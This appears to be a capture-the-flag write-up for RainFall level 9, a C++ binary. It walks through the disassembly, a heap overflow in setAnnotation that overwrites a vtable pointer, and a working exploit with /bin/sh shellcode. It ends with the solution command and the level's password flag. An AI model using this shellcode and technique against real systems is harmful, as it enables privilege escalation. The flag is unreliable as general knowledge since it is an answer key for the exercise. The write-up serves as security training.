
### notes
```c
0x080486f6  N::N(int) : CPP class method
0x0804870e  N::setAnnotation(char*) : CPP class method
0x0804873a  N::operator+(N&) : CPP class method
0x0804874e  N::operator-(N&) : CPP class method
0x080485f4  main : function
```

### 0x08048529 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    int argc = ebp+8
    char **argv = ebp+12

    char *buffer_1 = esp+28
    char *buffer_2 = esp+18
    char *nFirst = esp+20
    char *nSecond = esp+16

    
    0x20 ... 32
    0x6c ... 108
    0x1c ... 28
    0x18 ... 24
    0x14 ... 20
    0x10 ... 16
}
```
* __`<0> ➜ <+7> : prepare stack frame for main function with size 32`__
```c
0x080485f4 <+0>:	push   ebp
0x080485f5 <+1>:	mov    ebp,esp
0x080485f7 <+3>:	push   ebx
0x080485f8 <+4>:	and    esp,0xfffffff0
0x080485fb <+7>:	sub    esp,32
```
* __`<+10> ➜ <+23> : exit with code 1 if no argument sent to program`__
```c
0x080485fe <+10>:	cmp    DWORD PTR [argc],1
0x08048602 <+14>:	jg     0x8048610 <main+28>
0x08048604 <+16>:	mov    DWORD PTR [esp],1
0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
if (argc <= 1)
    exit(1);
```
* __`<+28> ➜ <+58> : create new instance of class N with value 5`__
```c
0x08048610 <+28>:	mov    DWORD PTR [esp],108
0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
0x0804861c <+40>:	mov    ebx,eax
0x0804861e <+42>:	mov    DWORD PTR [esp+4],5
0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei> // N::N(int)
0x0804862e <+58>:	mov    DWORD PTR [buffer_1],ebx
buffer_1 = N(5)
```
* __`<+62> ➜ <+92> : create new instance of class N with value 6`__
```c
0x08048632 <+62>:	mov    DWORD PTR [esp],108
0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
0x0804863e <+74>:	mov    ebx,eax
0x08048640 <+76>:	mov    DWORD PTR [esp+4],6
0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
0x08048650 <+92>:	mov    DWORD PTR [buffer_2],ebx
buffer_2 = N(6)
```
* __`<+96> ➜ <+108> : put the address returned by instances created in two different buffer in our stack`__
```c
0x08048654 <+96>:	mov    eax,DWORD PTR [buffer_1]
0x08048658 <+100>:	mov    DWORD PTR [nFirst],eax
0x0804865c <+104>:	mov    eax,DWORD PTR [buffer_2]
0x08048660 <+108>:	mov    DWORD PTR [nSecond],eax
nFirst = buffer_1
nSecond = buffer_2
```
* __`<+112> ➜ <+131> : call the method setAnnotation of the N class with first argument as param`__
```c
0x08048664 <+112>:	mov    eax,DWORD PTR [argv]
0x08048667 <+115>:	add    eax,4
0x0804866a <+118>:	mov    eax,DWORD PTR [eax]  
0x0804866c <+120>:	mov    DWORD PTR [esp+4],eax // param2 = argv[1]
0x08048670 <+124>:	mov    eax,DWORD PTR [nFirst]
0x08048674 <+128>:	mov    DWORD PTR [esp],eax // param1 = nFirst
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> // N::setAnnotation(char*)
buffer3.setAnnotation(argv[1]])
```
* __`<+136> ➜ <+159> : call second instaance with two params (second instance, first instance)`__
```c
0x0804867c <+136>:	mov    eax,DWORD PTR [nSecond]
0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
edx = **nSecond
0x08048684 <+144>:	mov    eax,DWORD PTR [nFirst]
0x08048688 <+148>:	mov    DWORD PTR [esp+4],eax // param2 = *nFirst
0x0804868c <+152>:	mov    eax,DWORD PTR [nSecond]
0x08048690 <+156>:	mov    DWORD PTR [esp],eax
0x08048693 <+159>:	call   edx
**nSecond(*nFirst)
```
* __`<+161> ➜ <+165> : exit function`__
```c
0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-4]
0x08048698 <+164>:	leave  
0x08048699 <+165>:	ret  
```
 


### Code Prediction 
- not really sure about the code prediction, it was a bit difficult to reverse that assembly 
```c
class N {
    private int number
    private char *str
    operator+(N& x) {
        return this.number + x
    }
    operator-(N& x) {
        return this.number - x
    }
    setAnnotation(char* txt) {
        memcpy(this.str, txt, len(txt))
    }
}
int main(int argc(argc), char **argv(ebp+12)) {
    if (argc <= 1)
        exit(1);

    buffer_1 = new N(5);
    buffer_2 = new N(6);

    nFirst = buffer_1;
    nSecond = buffer_2;

    nFirst.setAnnotation(argv[1]]);
    **nSecond(*nFirst);

    return;
}

```
---
### Process of the Exploit
- from the syntax of the functions, the code is written in CPP (c++)
- the program creat two instances of the class N (5, 6 as params each time)
- the prgram calls setAnnotation of N(5) with first argument as param.
- setAnnotation takes a string and copy it into the property of the class instance **annotiation** in the heap with memcpy without a length check,
    so it vulnerable to overwrite other unwanted area in the Heap.
- let observe the state of the heap at the end of the programm before leaving
    ```c
    (gdb) b * main+161
    Breakpoint 4 at 0x8048695
    (gdb) run AAAA
    (gdb) x/70wx 0x804a000
                                                                    AAAA
    0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141 <---+-------+
    0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000     |       |
    0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000     |       |       
    0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000     | N(5)  | 104
    0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000     |       |       
    0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000     |       |       
    0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000 <---+-------+

    0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 <---+-------+       
    0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000     |       |
    0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000     |       | 
    0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000     | N(6)  | 104
    0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000     |       |
    0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000     |       |
    0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000 <---+-------+

    0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
    0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a100:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a110:	0x00000000	0x00000000

    ```
- the N(6) placed right under N(5) area in the heap
- the line main+161 , is calling the N(6) by its address (0x08048848)
- lets try to overwrite it with the memcpy by filling and the size of first N which is 108
    ```c
    (gdb) run $(python -c 'print "A" * 108 + "BBBB"')
    Program received signal SIGSEGV, Segmentation fault.

    0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
    0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804a070:	0x41414141	0x41414141	0x42424242	0x00000000
    0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
    ```
- its overwritten , but the program SEGFAULT as u can see
- the idea is to put a shellcode in the annotiation of N(5)
- lets try this payload : **PADDING + SHELLCODE + POINTER_TO_START_PADDING**
**`shellcode : "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`**
    ```shell
    (gdb) run $(python -c 'print "A" * 87 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')

    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /home/user/level9/level9 $(python -c 'print "A" * 87 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    ```
- weird !! the program is trying to call 0x41414141, which means its try to point again to the first address following the call as param
- lets view the registers
    ```shell
    (gdb) i r
    eax            0x804a078	134520952
    ecx            0x804a00c	134520844
    edx            0x41414141	1094795585
    ebx            0x804a078	134520952
    esp            0xbffff68c	0xbffff68c
    ebp            0xbffff6b8	0xbffff6b8
    esi            0x0	0
    edi            0x0	0
    eip            0x41414141	0x41414141
    eflags         0x210283	[ CF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) 
    ```
- edx : 0x41414141, even 0x0804a00c that was given
if you go back to assembly , exactly between <+136> ➜ <+159> you will notice that it points 2 times to the address in edx
- lets adapt our payload to that

    **`*ADDRESS = ADDRESS+0x4`**
    **`*0x0804a00c = 0x0804a00c+0x4`**
    **`*0x0804a00c = 0x804a010`**
- refactor our payload : **POINTER2 + PADDING + SHELLCODE + POINTER1_TO_POINTER2**
>__$(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')__

    ```shell
    (gdb) run $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /home/user/level9/level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')
    process 3641 is executing new program: /bin/dash
    Error in re-setting breakpoint 4: No symbol table is loaded.  Use the "file" command.
    Error in re-setting breakpoint 4: No symbol table is loaded.  Use the "file" command.
    Error in re-setting breakpoint 4: No symbol table is loaded.  Use the "file" command.
    $ whoami
    level9
    $ 
    ```
- :) 
---
### Solution :

```shell
level9@RainFall:~$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "A" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x0c"[::-1]')
$ 
$ whoami
bonus0
$ pwd
/home/user/level9
$ cat /home/user/bonus0/.pass       
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
```
**Flag : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`**
